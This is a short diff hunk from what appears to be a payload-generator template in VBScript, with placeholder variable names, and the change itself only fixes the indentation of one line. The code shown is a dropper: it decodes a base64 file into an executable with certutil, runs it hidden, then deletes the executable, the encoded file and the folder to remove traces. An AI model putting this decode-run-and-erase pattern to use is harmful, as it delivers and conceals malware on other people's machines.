@@ -19,7 +19,7 @@ Function %{var_func}()
 	Set %{var_shell} = CreateObject("Wscript.Shell")
 	%{var_shell}.run "certutil -decode " & %{var_tempbase64} & " " & %{var_tempexe}, 0, true
 	%{var_shell}.run %{var_tempexe}, 0, true
-    %{var_obj}.DeleteFile(%{var_tempexe})
+	%{var_obj}.DeleteFile(%{var_tempexe})
 	%{var_obj}.DeleteFile(%{var_tempbase64})
 	%{var_obj}.DeleteFolder(%{var_basedir})
 End Function
